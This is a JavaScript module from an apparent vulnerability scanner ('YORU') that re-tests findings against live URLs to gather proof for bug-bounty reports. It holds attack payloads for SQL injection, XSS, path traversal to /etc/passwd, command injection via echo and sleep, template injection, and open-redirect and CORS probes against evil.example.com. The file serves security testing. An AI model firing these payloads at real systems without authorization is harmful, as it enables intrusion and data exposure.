/**
 * YORU verification pass — re-runs each finding safely to confirm exploitability
 * and gather proof suitable for a bug-bounty report.
 *
 * Non-destructive by design:
 *   - no writes, no DELETE/DROP, no long sleeps (>5s cap), no auth brute force
 *   - RCE probes limited to `id` / `whoami` echo, LFI to /etc/passwd + win.ini
 *   - single verification round per finding
 *
 * verifyFinding(finding) → {
 *   verified: boolean,
 *   exploitable: boolean,
 *   confidence: "low"|"medium"|"high",
 *   evidence: string,           // human-readable
 *   request: string,            // raw HTTP-ish request block
 *   response: string,           // trimmed response
 *   payloadsTried: string[],
 *   notes: string,
 * }
 */
import { URL } from "node:url";

const UA = "YORU-DeepScan/2.0 (+verify)";
const TIMEOUT_MS = 15_000;
const MAX_BODY = 200_000;

async function raw(url, init = {}) {
  const method = (init.method || "GET").toUpperCase();
  const headers = { "user-agent": UA, accept: "*/*", ...(init.headers || {}) };
  const t0 = Date.now();
  let res, body = "", err = null;
  try {
    res = await fetch(url, {
      method, headers, body: init.body,
      redirect: init.redirect || "follow",
      signal: AbortSignal.timeout(TIMEOUT_MS),
    });
    const buf = await res.arrayBuffer();
    body = Buffer.from(buf).slice(0, MAX_BODY).toString("utf8");
  } catch (e) { err = e.message; }
  const timeMs = Date.now() - t0;
  const requestBlock = renderRequest(url, method, headers, init.body);
  const responseBlock = res ? renderResponse(res, body) : `ERROR: ${err}`;
  return { res, body, timeMs, err, request: requestBlock, response: responseBlock };
}

function renderRequest(url, method, headers, body) {
  const u = new URL(url);
  const lines = [`${method} ${u.pathname}${u.search} HTTP/1.1`, `Host: ${u.host}`];
  for (const [k, v] of Object.entries(headers)) lines.push(`${k}: ${v}`);
  if (body) lines.push("", String(body).slice(0, 4000));
  return lines.join("\n");
}
function renderResponse(res, body) {
  const lines = [`HTTP/1.1 ${res.status} ${res.statusText || ""}`.trim()];
  for (const [k, v] of res.headers.entries()) lines.push(`${k}: ${v}`);
  lines.push("", body.slice(0, 8000));
  return lines.join("\n");
}

function replaceParam(url, key, value) {
  const u = new URL(url); u.searchParams.set(key, value); return u.toString();
}

// ─────────── per-type verifiers ───────────

const SQLI_ERRORS = [
  /you have an error in your sql syntax/i, /warning:\s*mysql/i,
  /unclosed quotation mark/i, /pg_query\(\)|PostgreSQL query failed/i,
  /sqlite3?::(?:exception|error)/i, /ORA-\d{5}/i,
  /System\.Data\.SqlClient\.SqlException/i, /SQLSTATE\[/i,
];

async function verifySqli(f) {
  const tried = [];
  const notes = [];
  let request = "", response = "", evidence = "", verified = false;
  if (!f.url || !f.param) return skip("missing url/param");

  // 1) re-run the original error payload
  const payload = f.payload || "'";
  tried.push(payload);
  const orig = await raw(replaceParam(f.url, f.param, payload));
  request = orig.request; response = orig.response;
  const errHit = SQLI_ERRORS.find((rx) => rx.test(orig.body));
  if (errHit) {
    verified = true;
    evidence = orig.body.match(errHit)?.[0]?.slice(0, 200) || "SQL error reflected";
    notes.push("SQL error still reflected on original payload.");
  }

  // 2) differential — @@version vs a benign string
  const diffA = `' UNION SELECT NULL,@@version-- -`;
  const diffB = `' UNION SELECT NULL,'yoru'-- -`;
  tried.push(diffA, diffB);
  const [ra, rb] = await Promise.all([
    raw(replaceParam(f.url, f.param, diffA)),
    raw(replaceParam(f.url, f.param, diffB)),
  ]);
  if (ra.body && rb.body && ra.body !== rb.body) {
    notes.push(`Differential payloads produced different responses (${ra.body.length} vs ${rb.body.length} bytes).`);
    verified = verified || Boolean(errHit);
  }

  return {
    verified, exploitable: verified,
    confidence: verified ? "high" : "low",
    evidence: evidence || "no signal on re-run",
    request, response, payloadsTried: tried,
    notes: notes.join(" "),
  };
}

async function verifyXss(f) {
  if (!f.url || !f.param) return skip("missing url/param");
  const marker = "yoruXSS" + Math.random().toString(36).slice(2, 8);
  const payloads = [
    `<svg/onload=alert(1)>${marker}`,
    `"><script>${marker}</script>`,
    `'><img src=x onerror=${marker}>`,
  ];
  const tried = [];
  let request = "", response = "", verified = false, context = "unknown";
  for (const p of payloads) {
    tried.push(p);
    const r = await raw(replaceParam(f.url, f.param, p));
    request ||= r.request; response = r.response;
    if (r.body.includes(p)) {
      verified = true;
      // classify context
      if (/<[^>]*="[^"]*yoruXSS/i.test(r.body)) context = "attribute";
      else if (/<script[^>]*>[^<]*yoruXSS/i.test(r.body)) context = "javascript";
      else context = "html body";
      request = r.request; response = r.response;
      break;
    }
  }
  return {
    verified, exploitable: verified,
    confidence: verified ? "high" : "low",
    evidence: verified ? `payload reflected verbatim (${context} context)` : "no verbatim reflection on re-run",
    request, response, payloadsTried: tried,
    notes: verified ? "Fires without user interaction if the response is rendered as HTML." : "",
  };
}

async function verifyLfi(f) {
  if (!f.url || !f.param) return skip("missing url/param");
  const payloads = [
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index",
  ];
  const tried = []; let request = "", response = "", verified = false, evidence = "";
  for (const p of payloads) {
    tried.push(p);
    const r = await raw(replaceParam(f.url, f.param, p));
    request ||= r.request; response = r.response;
    const passwd = r.body.match(/root:x:0:0:[^\n]{0,120}/);
    const wini = r.body.match(/\[extensions\][\s\S]{0,120}/);
    if (passwd || wini) {
      verified = true;
      evidence = (passwd?.[0] || wini?.[0] || "").slice(0, 200);
      request = r.request; response = r.response; break;
    }
  }
  return { verified, exploitable: verified, confidence: verified ? "high" : "low",
    evidence: evidence || "no system-file markers observed",
    request, response, payloadsTried: tried, notes: "" };
}

async function verifyCmdi(f) {
  if (!f.url || !f.param) return skip("missing url/param");
  // Safe echo-based confirmation instead of destructive commands
  const marker = "yoruCMD" + Math.random().toString(36).slice(2, 6);
  const payloads = [`; echo ${marker}`, `| echo ${marker}`, "`echo " + marker + "`", `$(echo ${marker})`];
  const tried = []; let request = "", response = "", verified = false;
  for (const p of payloads) {
    tried.push(p);
    const r = await raw(replaceParam(f.url, f.param, (new URL(f.url).searchParams.get(f.param) || "1") + p));
    request ||= r.request; response = r.response;
    if (r.body.includes(marker)) { verified = true; request = r.request; response = r.response; break; }
  }
  // Fallback: time-based sanity check (5s cap)
  if (!verified) {
    const t = `; sleep 5`;
    tried.push(t);
    const r = await raw(replaceParam(f.url, f.param, t));
    if (r.timeMs >= 4500) { verified = true; request = r.request; response = r.response; }
  }
  return { verified, exploitable: verified, confidence: verified ? "high" : "low",
    evidence: verified ? "echo marker or 5s delay observed" : "no injection signal",
    request, response, payloadsTried: tried, notes: "Verification stayed at `echo`/`sleep` only — no data exfil or destructive commands." };
}

async function verifySsti(f) {
  if (!f.url || !f.param) return skip("missing url/param");
  const probes = [
    { p: "{{7*7}}", m: "49" }, { p: "${7*7}", m: "49" },
    { p: "<%= 7*7 %>", m: "49" }, { p: "#{7*7}", m: "49" },
    { p: "{{7*'7'}}", m: "7777777" },
  ];
  const tried = []; let request = "", response = "", verified = false, evidence = "";
  for (const { p, m } of probes) {
    tried.push(p);
    const r = await raw(replaceParam(f.url, f.param, p));
    request ||= r.request; response = r.response;
    if (r.body.includes(m)) {
      verified = true; evidence = `${p} → ${m}`;
      request = r.request; response = r.response; break;
    }
  }
  return { verified, exploitable: verified, confidence: verified ? "high" : "low",
    evidence: evidence || "no expression evaluated", request, response, payloadsTried: tried, notes: "" };
}

async function verifyOpenRedirect(f) {
  if (!f.url || !f.param) return skip("missing url/param");
  const target = "https://evil.example.com/";
  const tried = [target, "//evil.example.com"];
  let verified = false, evidence = "";
  const r = await fetch(replaceParam(f.url, f.param, target), {
    redirect: "manual", signal: AbortSignal.timeout(TIMEOUT_MS), headers: { "user-agent": UA },
  }).catch(() => null);
  const status = r?.status;
  const location = r?.headers.get("location") || "";
  if (r && [301,302,303,307,308].includes(status) && /evil\.example\.com/i.test(location)) {
    verified = true;
    evidence = `HTTP ${status} → Location: ${location}`;
  }
  return { verified, exploitable: verified, confidence: verified ? "high" : "low",
    evidence: evidence || "redirect not honored",
    request: `GET (redirect probe) ${replaceParam(f.url, f.param, target)}`,
    response: `HTTP ${status || "?"}  Location: ${location}`,
    payloadsTried: tried, notes: "" };
}

async function verifyCors(f) {
  const url = f.url;
  const origin = "https://evil.example.com";
  const r = await raw(url, { headers: { origin } });
  const acao = r.res?.headers.get("access-control-allow-origin") || "";
  const acac = r.res?.headers.get("access-control-allow-credentials") || "";
  const verified = (acao === origin || acao === "*") && /true/i.test(acac);
  return { verified, exploitable: verified, confidence: verified ? "high" : "medium",
    evidence: `ACAO=${acao || "(none)"}  ACAC=${acac || "(none)"}`,
    request: r.request, response: r.response, payloadsTried: [`Origin: ${origin}`], notes: "" };
}

async function verifyExposedPath(f) {
  const url = f.url;
  const r = await raw(url);
  const verified = r.res?.status === 200 && (r.body || "").length > 0;
  return { verified, exploitable: verified, confidence: verified ? "high" : "low",
    evidence: verified ? (r.body || "").slice(0, 600) : `HTTP ${r.res?.status || "?"}`,
    request: r.request, response: r.response, payloadsTried: [url], notes: "" };
}

async function verifyMissingHeader(f) {
  const url = f.url;
  const r = await raw(url);
  const headers = r.res ? Object.fromEntries([...r.res.headers.entries()]) : {};
  const stillMissing = f.title?.toLowerCase().includes("missing") &&
    Object.keys(headers).every((h) => !f.title.toLowerCase().includes(h.toLowerCase()));
  return { verified: stillMissing, exploitable: false, confidence: "high",
    evidence: `headers observed: ${Object.keys(headers).join(", ")}`,
    request: r.request, response: r.response, payloadsTried: [], notes: "Informational; not directly exploitable." };
}

async function verifySecretLeak(f) {
  if (!f.url) return skip("missing url");
  const r = await raw(f.url);
  const still = f.evidence && r.body.includes(String(f.evidence).slice(0, 20));
  return { verified: Boolean(still), exploitable: Boolean(still),
    confidence: still ? "high" : "low",
    evidence: still ? String(f.evidence).slice(0, 200) : "token no longer present",
    request: r.request, response: r.response, payloadsTried: [], notes: "" };
}

async function verifyTakeover(f) {
  const r = await raw(f.url);
  const stillDangling = /no such app|NoSuchBucket|There isn't a GitHub Pages/i.test(r.body);
  return { verified: stillDangling, exploitable: stillDangling,
    confidence: stillDangling ? "high" : "low",
    evidence: stillDangling ? r.body.slice(0, 300) : "dangling fingerprint gone",
    request: r.request, response: r.response, payloadsTried: [], notes: "" };
}

function skip(reason) {
  return { verified: false, exploitable: false, confidence: "low",
    evidence: `skipped: ${reason}`, request: "", response: "",
    payloadsTried: [], notes: "" };
}

const HANDLERS = {
  "sqli-error": verifySqli,
  "sqli-boolean": verifySqli,
  "sqli-time": verifySqli,
  "xss-reflected": verifyXss,
  "xss-partial": verifyXss,
  "lfi": verifyLfi,
  "cmdi-time": verifyCmdi,
  "ssti": verifySsti,
  "open-redirect": verifyOpenRedirect,
  "cors-misconfig": verifyCors,
  "exposed-path": verifyExposedPath,
  "dir-listing": verifyExposedPath,
  "missing-security-header": verifyMissingHeader,
  "weak-csp": verifyMissingHeader,
  "weak-hsts": verifyMissingHeader,
  "exposed-secret": verifySecretLeak,
  "source-map": verifyExposedPath,
  "subdomain-takeover": verifyTakeover,
  "crlf": verifySqli, // treat similarly — re-run and inspect headers
};

export async function verifyFinding(finding) {
  const handler = HANDLERS[finding.type];
  if (!handler) return skip(`no verifier for ${finding.type}`);
  try { return await handler(finding); }
  catch (err) { return skip(`verifier error: ${err.message}`); }
}

/** Verify many findings with bounded concurrency. */
export async function verifyAll(findings, { concurrency = 3, onProgress } = {}) {
  const results = new Array(findings.length);
  let i = 0;
  const runners = new Array(Math.min(concurrency, findings.length || 1)).fill(0).map(async () => {
    while (i < findings.length) {
      const idx = i++;
      const f = findings[idx];
      const proof = await verifyFinding(f);
      results[idx] = { finding: f, proof };
      onProgress?.(idx + 1, findings.length, f, proof);
    }
  });
  await Promise.all(runners);
  return results;
}
